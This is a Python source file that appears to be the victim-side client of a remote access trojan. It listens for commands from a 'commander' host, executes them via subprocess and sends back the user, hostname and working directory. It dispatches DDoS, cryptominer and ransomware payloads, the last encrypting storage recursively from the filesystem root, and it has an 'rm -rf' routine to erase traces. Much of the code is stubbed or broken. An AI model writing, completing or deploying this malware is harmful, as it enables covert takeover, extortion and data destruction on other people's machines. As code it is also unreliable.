import subprocess
import socket 
import sys
import argparse
import Payloads
import os
from Payloads import ransomware_v3

icon = """\
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""

parser = argparse.ArgumentParser(prog='Target.py')
parser.add_argument('-c', '--commander')
args = parser.parse_args()
status = 'idle'

class Shell:
	"""This class executes commands and gets informations from the system (pwd, user)"""
	def __init__(self):
		# linux
		self.pwd = subprocess.run('pwd', capture_output=True).stdout.split(b'\n')[0]
		self.user = subprocess.run('whoami', capture_output=True).stdout.split(b'\n')[0]
		self.machine_ip = socket.gethostname()

		# MacOS
		# Windows
	
	def update_directory(self):
		# Function to get the present working directory
		self.pwd = subprocess.run('pwd', capture_output=True).stdout.split('\n')[0]
		return self.pwd

	def exec_command(command: list):
		# Function that executes commands
		full_command = []
		for i in command:
			full_arg = '-' + i.join()
			full_command.append(full_arg)
		full_command = full_command.join()
		output = subprocess.run(full_command, capture_output=True).stdout.split('\n')[0]
		return output

class Payload:
	ammount = 0
	def __init__(self):
		if Payloads.ammount == 1:
			self.__del__()

		global status
		Payloads.ammount += 1

		# By default bot is set on IDLE mod
		self.status = self.idle()

	def request_creator(self, target: str, port: int):
		# Creates a request to ddos
		pass

	def miner(self, performance:int=75):
		pass 

	def ransomware(self, wholeStorage:bool=True, whatOrigine:str='') -> bool:
		status = f'encrypting system from {whatOrigine}'
		root = os.path.abspath('.').split(os.path.sep)[0]+os.path.sep

		if wholeStorage:
			try:
				isSuccess = ransomware_v3.recursive_encrypt(root)
				return isSuccess 
			except:
				isSuccess = False
				return isSuccess 
		try:
			isSuccess = ransomware_v3.encrypt(whatOrigine)
			return isSuccess 
		except:
			isSuccess = False
			return isSuccess	
		
		

	def idle(self):
		pass 

class Client:
	"""This class is used to connect to the distant server, it sends outputs, receive commands and deals with errors"""
	#return_error_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#return_error_socket.connect((args.commander, 12012))

	def __init__(self, commander_ip: str, shell: Shell):
		self.commander_ip = commander_ip
		self.shell = shell 

		self.payloads = Payloads.Payloads()
		self.payloads_dict = {'ddos': self.payloads.ddos, 'miner': self.payloads.miner, 'ransomware': self.payloads.ransomware, \
				   'idle': self.payloads.idle}

		# Initializing the socket that receives commands
		reception_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		reception_socket.bind(('localhost', 12005))
		reception_socket.listen()

		answer_socket = None
		address = None

		while answer_socket == None and address == None:
			answer_socket, address = reception_socket.accept()

		# Initialiizing the socket that sends output
		self.send_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.send_socket.connect((self.commander_ip, 12006))

		# Authentification if another system than the server connects
		print(answer_socket)
		if self.commander_ip != address:
			if answer_socket.recv(1024).decode() != 'Ezyv2g83q6y8g62':
				self.__del__(1)

		# Gets the order
		order: str = answer_socket.recv(8192).decode()

		# Formats the order
		try:
			splitted_order = order.split(',')
			main_order = splitted_order[0]
			splitted_order.pop(0)

			if len(splitted_order) > 1:
				self.payloads_dict[main_order(*splitted_order)]
			else:
				self.payloads_dict[main_order()]
		
		except:
			full_order = [order.split(',')[0]]
			for i in order.split(','):
				try:
					(paramater, value) = i.split(' ')
					full_order.append([paramater, value])

				except: 
					full_order.append([i])

			output = self.shell.exec_command(full_order)

		# Sends output to server
		self.send_socket.send((self.shell.pwd, self.shell.machine_ip, self.shell.user))
		self.send_socket.send(output.encode())

	def __del__(self, error_code: int=100) -> bool:
		if error_code == 100:
			Client.return_error_socket.send(b'Something went wrong !')
			return False
		# This function prevents the Client to shut down without sending an error
		if error_code == 1:
			Client.return_error_socket.send(b'Remote connection closed by host ! Wrong password')
			return True 
		# Not implemented right now
		if error_code == 0:
			# This sequence musn't leave any trace of the RAT
			Client.return_error_socket.send(b'Clearing sequence initialized ! Bot shut down')
			subprocess.run(f"rm -rf {sys.argv[1]}".encode('utf-8'))

		else:
			# If an unknown error accurs 
			Client.return_error_socket.send("Something went wrong...")
			return True 

def main():
	"""The main function"""
	#connectionIsLive = True 
	#payload = Payloads.Payloads()
	#payload.ddos(target='https://google.com')
	#shell = Shell()
	#while connectionIsLive:
	#try:
	#client = Client('localhost', shell)
	#connectionIsLive = client
	#except:
		#print('something went wrong')

main()
